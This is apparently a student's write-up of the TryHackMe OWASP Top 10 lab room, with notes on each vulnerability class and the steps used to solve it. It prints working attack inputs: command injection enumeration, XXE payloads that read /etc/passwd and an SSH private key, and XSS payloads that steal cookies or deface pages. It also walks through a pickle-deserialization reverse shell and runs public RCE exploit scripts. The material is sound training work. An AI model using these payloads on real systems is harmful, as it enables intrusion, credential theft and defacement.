#OWASP #FreeRoom 

https://tryhackme.com/r/room/owasptop102021

1. broken access control (IDOR)
2. cryptographic failures
3. inject / command injection
4. insecure design
5. security misconfiguration
6. vulnerable & outdated components
7. ID and Authentication failures
8. software and data integrity failures
9. security logging & monitoring failures
10. server side request forgery (SSRF)

---

## Command Injection 

Blind command injection occurs when the system command made to the server does not return the response to the user in the HTML document.

Active command injection will return the response to the user.

---
EvilCorp has started development on a web based shell but has accidentally left it exposed to the Internet.
- `evilshell.php`

Ways to detect active command injection
- you can see the response from the system call
- `passthru()` is main function in example which is passing input directly to document
- seeing input on document lets you enumerate commands

| Linux      | Windows       |
| ---------- | ------------- |
| `whoami`   | `whoami`      |
| `id`       | `ver`         |
| `ifconfig` | `ipconfig`    |
| `uname -a` | `tasklist`    |
| `ps -ef`   | `netstat -an` |

go to `http://x.x.x.x/evilshell.php`

whoami = www-data
ls = css drpepper.txt  evilshell.php, index.php

What strange text file is in the website root directory?
- drpepper.txt

How many non-root/non-service/non-daemon users are there?

- la -la
```
total 28 
drwxr-x--- 4 www-data www-data 4096 Jun 3 2020 
drwxr-xr-x 3 root root 4096 May 18 2020 .. 
drwxr-x--- 2 www-data www-data 4096 May 21 2020 css 
-rw-r----- 1 www-data www-data 17 May 22 2020 drpepper.txt 
-rw-r----- 1 www-data www-data 1723 May 26 2020 evilshell.php 
-rw-r----- 1 www-data www-data 2200 May 21 2020 index.php 
drwxr-x--- 2 www-data www-data 4096 May 21 2020 js 
```

- 0

What user is this app running as?
- www-data

What is the user's shell set as?
- `cat /etc/passwd`
- /usr/sbin/nologin

What version of Ubuntu is running?
- `lsb_release -a`
- Ubuntu 18.04.4 LTS

Print out the MOTD.  What favorite beverage is shown?
- MOTD = message of the day, found in /etc/motd
- find motd
- `/etc/update-motd.d`
- the answer is obvious = dr pepper
---

## Broken Authentication

Authentication allows users to gain access to web applications by verifying their identities.
- username
- password
- the sever verifies credentials, server issues a session cookie which tacks user and actions

flaw in authentication opens access to users' accounts with attacks
- brute force attack of username and passwords
- weak credentials settings and password policy
- weak session cookies, using predictable values allows attacker to set their own session cookie and access accounts

mitigation
- avoid password guessing attacks, have strong password policy
- avoid brute force, have lockouts after specific number of attempts
- implement multi factor authentication

---
developers forget to sanitize user input which makes them vulnerable to SQL injection
- username: admin
- try entering " admin" and enter password and it registers a new user with same privileges as normal admin

`http://x.x.x.x:8888`
- username: " darren"
- register new account, ` darren` : `password`  flag: `fe86079416a21a3c99937fea8874b667`
- same trick but for arthur, ` arthur` : `password`  flag: `d9ac0f7db4fda460ac3edeb75d75e16e`

## Sensitive Data Exposure

a web app accidentally divulges sensitive data, we refer to it as "Sensitive Data Exposure"
- customers names, DOBs, financial info
- usernames and passwords
- Man in the Middle attacks, forcing users to connect to sites attacker controls (weak encryption) and exploit data

large amount of data is in a database like SQL , MariaDB, MySQL or flat files on computer

if database is stored at /root of website
then you can download it and query on your machine

SQLite database / SQLite3 (on Kali)

access DB  `sqlit3 <db name>`
see tables `.tables`
table information `PRAGMA table_info(customers);`
dump customer info from table `SELECT * FROM customers;`

` 0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99 `
- customer ID `0`
- customer name `Joy Paulson`
- creditcard `4916 9012 2231 7905`
- password hash `5f4dcc3b5aa765d61d8327deb882cf99`

can use ` https://crackstation.net/ ` or ` https://hashes.com/en/decrypt/hash ` to crack hashes
- `5f4dcc3b5aa765d61d8327deb882cf99:password`

---

`http://x.x.x.x:80` 

What is the name of the mentioned directory?
- Have a look at the source code on the /login page.
- inspect page source , comment on /assets
- `/assets`

Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?
- `webapp.db`

  
Use the supporting material to access the sensitive data. What is the password hash of the admin user?

- downloaded `webapp.db` 
- `sqlite3 webapp.db`
- `.tables` = sessions and users
- `PRAGMA table_info(customers);`  userID, username, password, admin
- admin , Bob (admin)
- admin hash ` 6eea9b7ef19179a06954edd0f6c05ceb ` 
- admin: ` 6eea9b7ef19179a06954edd0f6c05ceb:qwertyuiop `

Login as the admin. What is the flag?
- `admin:qwertyuiop`
- ` THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl} `

## XML External Entity

An XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data.
- allows attacker to interact with backend or external systems and read the file on that system
- can cause Denial of Service (DoS) attack
- use XXE to perform server-side request forgery SSRF using the app to make requests to other apps , even enable port scanning and lead to remote code execution RCE

2 types of XXE:
- `in-band XXE` attack = attacker can receive an immediate response to the XXE payload
- `out-of-band XXE` attack = (blind XXE) no immediate response from the web app, attacker has to reflect the output of their XXE payload to some file 

XML _extensible markup language_
- runs on all OS
- data stored and transported using XML can be changed at any time
- allows validation using DTD and Schema, validation from syntax error
- simplifies data sharing between various systems, data doesn't need conversion

syntax:
xml prolog 
root element 
children elements
```
<?xml version="1.0" encoding="UTF-8"?>  
<mail>
 <to>falcon </to>
 <from>feast</from>
 <subject>About XXE</subject>
 <text>Teach XXE</text>
</mail>
```

EXTERNAL ENTITY: DTD

DTD = document type definition, define the structure and legal elements , attrs of XML doc

file: `note.dtd`
```
<!DOCTYPE note [ <!ELEMENT note (to,from,heading,body)> <!ELEMENT to (#PCDATA)> <!ELEMENT from (#PCDATA)> <!ELEMENT heading (#PCDATA)> <!ELEMENT body (#PCDATA)> ]>
```

use this to validate info of some XML doc
```
<?xml version="1.0" encoding="UTF-8"?>  
<!DOCTYPE note SYSTEM "note.dtd">  
<note>  
    <to>falcon</to>  
    <from>feast</from>  
    <heading>hacking</heading>  
    <body>XXE attack</body>  
</note>
```

- !DOCTYPE note: Defines a root element of the document named note
- !ELEMENT note: Defines that the note element must contain the elements: "to, from, heading, body"
- !ELEMENT to: Defines the `to` element to be of type "#PCDATA"
- !ELEMENT from: Defines the `from` element to be of type "#PCDATA"
- !ELEMENT heading: Defines the `heading` element to be of type "#PCDATA"
- !ELEMENT body: Defines the `body` element to be of type "#PCDATA"
- PCDATA means parseable character data.

define an element = `!ELEMENT`
define a root element = `!DOCTYPE`
define a new entity = `!ENTITY`

EXTERNAL ENTITY: XXE PAYLOAD

```
<!DOCTYPE replace [<!ENTITY name "feast"> ]>  
 <userInfo>  
  <firstName>falcon</firstName>  
  <lastName>&name;</lastName>  
 </userInfo>
```

defining entity called name and assigning value feast

```
<?xml version="1.0"?>  
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>  
<root>&read;</root>
```

entity name read , setting value to system path of the file = `/etc/passwd`
or read other files but often fails

---
`http://x.x.x.x:80`  XXE attack

BurpSuite request , payload to display name falcon feast, use this code

```
<?xml version="1.0" encoding="UTF-8"?>  
<mail>
 <to>falcon </to>
 <from>feast</from>
 <subject>About XXE</subject>
 <text>Teach XXE</text>
</mail>
```

  
See if you can read the `/etc/passwd`

```
<?xml version="1.0"?>  
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>  
<root>&read;</root>
```

then open source code, it matches the image for task

  
What is the name of the user in  `/etc/passwd`
- bottom of source code `falcon:x:1000:falcon,,,:/home/falcon:/bin/bash`
- falcon

Where is falcon's SSH key located?
- SSH keys are store on Linux `/home/<username>/.ssh/id_rsa`
- `/home/falcon/.ssh/id_rsa `

What are the first 18 characters for falcon's private key

```
<?xml version="1.0"?>  
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:/home/falcon/.ssh/id_rsa'>]>  
<root>&read;</root>

```

the returns the RSA private key
- ` MIIEogIBAAKCAQEA7b `

## Broken Access Control 

A regular visitor being able to access protected pages, can lead to the following:
- Being able to view sensitive information
- Accessing unauthorized functionality

Attack Scenarios:

1. the app uses unverified data in a SQL call that accesses account info

```
pstmt.setString(1, request.getParameter("acct"));

ResultSet results = pstmt.executeQuery( );
```

An attacker simply modifies the ‘acct’ parameter in the browser to send whatever account number they want
- ` http://example.com/app/accountInfo?acct=notmyacct `

2. attacker simply force browses to target URLs. Admin rights are required for access to the admin page

```
http://example.com/app/getappInfo

http://example.com/app/admin_getappInfo
```

- If an unauthenticated user can access either page, it’s a flaw
- If a non-admin can access the admin page, this is a flaw
---
IDOR, or Insecure Direct Object Reference, is the act of exploiting a misconfiguration in the way user input is handled, to access resources you wouldn't ordinarily be able to access. IDOR is a type of access control vulnerability.

- `  https://example.com/bank?account_number=1234 `

`http:x.x.x.x` 
`root:test1234`

`http://x.x.x.x/note.php?note=0`
- ` flag{fivefourthree} `

## Security Misconfiguration

Security misconfigurations include:

- Poorly configured permissions on cloud services, like S3 buckets
- Having unnecessary features enabled, like services, pages, accounts or privileges
- Default accounts with unchanged passwords
- Error messages that are overly detailed and allow an attacker to find out more about the system
- Not using [HTTP security headers](https://owasp.org/www-project-secure-headers/), or revealing too much detail in the Server: HTTP header

default passwords is common for IoT devices and routers/ modems exposed to Telnet services

`http://x.x.x.x `  see Pensive Notes login page
new tab, search pensive notes > GitHub > NinjaJc01
- `pensive:PensiveNotes`

- ` thm{4b9513968fd564a87b28aa1f9d672e17} ` 

## Cross Site Scripting 

Cross-site scripting, also known as XSS is a security vulnerability typically found in web applications. It’s a type of injection which can allow an attacker to execute malicious scripts and have it execute on a victim’s machine.

web application is vulnerable to XSS if it uses unsanitized user input.
- XSS is possible in Javascript, VBScript, Flash and CSS

3 TYPES OF XSS
- stored XSS = malicious string originates from the website's database (unsanitized user input) is inserted into the database
- reflected XSS = malicious payload is part of the victims request to the website , response back to user, trick user to click url to execute malicious payload
- DOM based XSS 

XSS PAYLOADS
- popup windows ` <script>alert(“Hello World”)</script> `
- writing HTML  ` document.write() ` add your own HTML 
```
<script>
document.write("<h2>Hello World!</h2><p>Have a nice day!</p>");
</script>
```

```
<script>
function myFunction() {
  document.write("Hello World");
}
</script>
```

- keylogger  ` http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html `
- port scanning  ` http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html `

---
`http://x.x.x.x`  

Reflected XSS

- enter a `<script>` into the search box  `<script>alert(“Hello”)</script`
- inspect source code but popup shows answer 
- ` ThereIsMoreToXSSThanYouThink `

reflected IP address
```
<script> alert(window.location.hostname)</script>
```

- ` ReflectiveXss4TheWin `

Stored XSS 

- register make a fake account > stored XSS

Then add a comment and see if you can insert some of your own HTML.
- hi
- `<h2> robots rule <h2>`
- ` HTML_T4gs `

On the same page, create an alert popup box appear on the page with your document cookies.
- `<script> alert(document.cookie) </script> `

```
connect.sid=s%3ANSZkyAZ-IckeM-XnzTIiLf7ceJKCaNmC.kazEeeBFYrhtFqDNJRzHuBW6Tc3m6ZSJp6qrUDYN69s
```

- look in the source code to see flag
- ` W3LL_D0N3_LVL2 `

  
Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.

- ` <script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script> `
-  ` websites_can_be_easily_defaced_with_xss `

for extra fun 
` <script>document.querySelector('h1').textContent = 'h4cked'</script> `

## Insecure Deserialization

insecure deserialization is replacing data processed by an application with malicious code
- low exploitability, no tools / framework for it
- ToE = TCP/IP Offload Engine, tech used in network interface cards
- exploit relies on attacker's skills

vulnerable when app that stores data or grabs data with no validation
- E-commerce sites
- forums
- APIs
- app runtimes (Tomcat, Jenkins, Jboss, etc)

---
  
Who developed the Tomcat application?
- ` the Apache software foundation `

What type of attack that crashes services can be performed with insecure deserialization?
- ` denial of service `

---
state and behaviour 

object: lamp
state: various light bulbs
behaviour: on/off 

serialization is process of converting objects used in programming into simpler format for transmitting between systems or networks for further processing or storage
- deserialization is reverse, simple to complex

password='password123' stored in database converted into binary

insecure deserialization from not filtering user input
- `binary `

### deserialization cookies

small pieces of data created by website and stored on user's computer
- they store login info
- session cookies clear when browser closes but could last at some later date

|   |   |   |
|---|---|---|
|Attribute|Description|Required?|
|Cookie Name|The Name of the Cookie to be set|Yes|
|Cookie Value|Value, this can be anything plaintext or encoded|Yes|
|Secure Only|If set, this cookie will only be set over HTTPS connections|No|
|Expiry|Set a timestamp where the cookie will be removed from the browser|No|
|Path|The cookie will only be sent if the specified URL is within the request|No|

CREATE COOKIES
- can be done Javascript, PHP or Python Flask

```
dateTime = datetime.now()
timestamp = str(dateTime)
resp.set_cookie("registrationTimeStamp", timestamp)
```

- `webapp.com/login `
- `https`

---
`http://x.x.x.x` 
Exchange your Vim
- create fake account
- inspect element > Storage tab
- cookies are in plaintext or base64

```
Name                  | Value
---------------------------------------------------
password              | password
registrationTimestamp | "YYYY-MM-DD hh:mm:ss"
sessionid             | <letter string>
username              | fake
userType              | user
```

- look at `sessionid`, copy string, `echo <paste string> | base64 -d`
- ` THM{good_old_base64_huh} `

MODIFY COOKIE VALUE
- cookie: `userType` 
- double left click `Value` column to modify content, change userType to `admin` and go to `http://x.x.x.x/admin` for 2nd flag

```
Name                  | Value
---------------------------------------------------
password              | password
registrationTimestamp | "YYYY-MM-DD hh:mm:ss"
sessionid             | <letter string>
username              | admin
userType              | admin
```

- copy `sessionid` 
- ` THM{heres_the_admin_flag} `

---
change `admin` back to `user`
-  `http://x.x.x.x/myprofile`
- click 'exchange your vim' > feedback page

```
Name                  | Value
---------------------------------------------------
encodedPayload        | <letter string>
password              | password
registrationTimestamp | "YYYY-MM-DD hh:mm:ss"
sessionid             | <letter string>
username              | user
userType              | user
```

```
cookie = {'replaceme': payload}
pickle_payload = pickle.dumps(cookie)
encodedPayloadCookie = base64.b64encode(pickle_payload)
resp = make_response(redirect("/myprofile"))
resp.set_cookie("encodedPayload", encodedPayloadCookie)
```

can see how the cookie is retrieved and then deserialized via `pickle.loads`

```
cookie = request.cookies.get("encodedPayload")
cookie = pickle.loads(base64.b64decode(cookie))
```

 First, we need to set up a netcat listener on our Kali.
 - ` nc -lvnp 4444 `
 - Because the code being deserialized is from a base64 format, we cannot just simply spawn a reverse shell. We must encode our own commands in base64 so that the malicious code will be executed.
 - ` wget https://assets.tryhackme.com/additional/cmn-owasptopten/pickleme.py `
 - `touch rce.py ` > open `pickleme.py` , copy and paste content from `pickleme.py` to `rce.py`  and add AttackBox IP address > `python3 rce.py`
 - copy everything between the ' '
 - paste in the 'encodedPayload' cookie in browser > refresh page > look at tab where listener is running
 - if done correctly `whoami` = `cmatic` and ls lists files
 - look for `flag.txt` 
 -  ` 4a69a7ff9fd68 `

## Known Vulnerabilities

let's say that a company hasn't updated their version of WordPress for a few years, and using a tool such as wpscan, you find that it's version 4.6. Some quick research will reveal that WordPress 4.6 is vulnerable to an unauthenticated remote code execution(RCE) exploit, and even better you can find an exploit already made on [exploit-db](https://www.exploit-db.com/exploits/41962).

- `python 47837.py x.x.x.x 80 id` id is for input

  
How many characters are in `/etc/passwd` (use `wc -c /etc/passwd` to get the answer)
- hint= You know its a bookstore application, you should check for recent unauthenticated bookstore app rce's.
- search `unauthenticated bookstore app rce` > download `47887.py`  
- `python3 47887.py http://x.x.x.x` > `RCE $`
- `wc -c /etc/passwd` > 1611

## Insufficient logging & monitoring

Without logging, there would be no way to tell what actions an attacker performed if they gain access to particular web applications.

- regulatory damage: if an attacker has gained access to personally identifiable user information and there is no record of this, not only are users of the application affected, but the application owners may be subject to fines or more severe actions depending on regulations.

- risk of further attacks: without logging, the presence of an attacker may be undetected. This could allow an attacker to launch further attacks against web application owners by stealing credentials, attacking infrastructure and more.

logs
```
- HTTP status codes
- Time Stamps
- Usernames
- API endpoints/page locations
- IP addresses
```

Common examples of suspicious activity includes:
- multiple unauthorized attempts for a particular action
- requests from anomalous IP addresses or locations
- use of automated tools
- common payloads : XSS

suspicious activity needs to be rated according to the impact level.

---
### References

- https://github.com/GohEeEn/TryHackMe-Write-Up/tree/master/OWASP_TOP_10
- others in writeups

